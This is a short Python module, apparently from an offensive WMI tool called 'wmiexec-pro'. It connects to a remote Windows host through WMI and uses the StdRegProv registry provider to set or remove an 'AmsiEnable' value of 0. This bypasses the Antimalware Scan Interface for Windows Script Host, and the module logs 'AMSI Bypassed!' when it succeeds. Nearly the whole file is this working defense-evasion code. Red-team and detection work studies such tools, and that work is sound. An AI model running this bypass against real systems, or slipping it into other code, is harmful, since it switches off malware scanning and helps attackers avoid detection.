import logging

from impacket.dcerpc.v5.dtypes import NULL


class AMSI():
    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.logger = logging.getLogger("wmiexec-pro")

    def amsi_Wrapper(self, flag):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        if flag == "enable":
            self.logger.info("Enabling AMSI bypass.")
            StdRegProv.SetDWORDValue(2147483649, "Software\\Microsoft\\Windows Script\\Settings", "AmsiEnable", 0)
        elif flag == "disable":
            self.logger.info("Disabling AMSI bypass.")
            StdRegProv.DeleteValue(2147483649, "Software\\Microsoft\\Windows Script\\Settings", "AmsiEnable")
        out = StdRegProv.GetDWORDValue(2147483649, "Software\\Microsoft\\Windows Script\\Settings", "AmsiEnable")
        if out.uValue == 0:
            self.logger.log(100, "AMSI Bypassed!")
        elif not out.uValue:
            self.logger.log(100, "Remove AMSI bypass.")